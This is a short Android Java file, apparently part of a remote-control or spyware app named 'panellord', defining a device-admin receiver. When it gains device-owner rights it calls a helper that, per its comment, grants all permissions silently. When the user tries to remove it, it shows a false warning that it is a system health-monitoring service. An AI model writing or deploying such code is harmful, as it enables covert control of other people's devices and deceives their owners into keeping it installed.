package com.panellord;

import android.content.Context;
import android.content.Intent;

public class DeviceAdminReceiver extends android.app.admin.DeviceAdminReceiver {

    @Override
    public void onEnabled(Context ctx, Intent intent) {
        // Device Owner set — immediately grant all permissions silently
        DeviceOwnerHelper.grantAllIfOwner(ctx);
    }

    @Override
    public CharSequence onDisableRequested(Context ctx, Intent intent) {
        return "System service required for device health monitoring.";
    }

    @Override
    public void onDisabled(Context ctx, Intent intent) {}
}
